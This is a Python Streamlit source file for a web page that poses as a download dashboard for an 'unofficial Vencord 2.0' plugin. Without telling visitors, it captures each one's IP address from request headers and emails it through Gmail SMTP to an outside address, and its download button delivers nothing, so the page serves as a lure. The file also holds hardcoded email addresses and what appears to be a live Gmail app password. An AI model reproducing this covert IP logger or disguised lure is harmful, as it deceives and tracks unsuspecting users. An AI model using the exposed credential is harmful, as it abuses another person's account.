import streamlit as st
import smtplib
from email.mime.text import MIMEText

# --- EMAIL SETTINGS ---
sender_email = "mahirbd2013@gmail.com"
receiver_email = "endersmithreturn@gmail.com"
app_password = "hesw qbse dkte xksw" 

def send_email(user_ip):
    msg = MIMEText(f"A user opened the site. IP: {user_ip}")
    msg['Subject'] = 'Vencord Site Access Log'
    msg['From'] = sender_email
    msg['To'] = receiver_email

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender_email, app_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
        return True
    except:
        return False

# --- THE AUTO-LOG LOGIC ---
# st.context.headers is the new way to grab network data
headers = st.context.headers

# Check for the IP in the headers
if "X-Forwarded-For" in headers:
    user_ip = headers["X-Forwarded-For"].split(",")[0]
    
    # Use session_state so it only emails you ONCE per visit
    if 'logged' not in st.session_state:
        send_email(user_ip)
        st.session_state['logged'] = True

# --- UI ---
st.write("## welcome to vencord 2.0 unofficial version")
st.title("Plugin Dashboard")
st.info("The plugin is ready for download below.")

if st.button("Download Vencord 2.0"):
    st.write("Starting download...")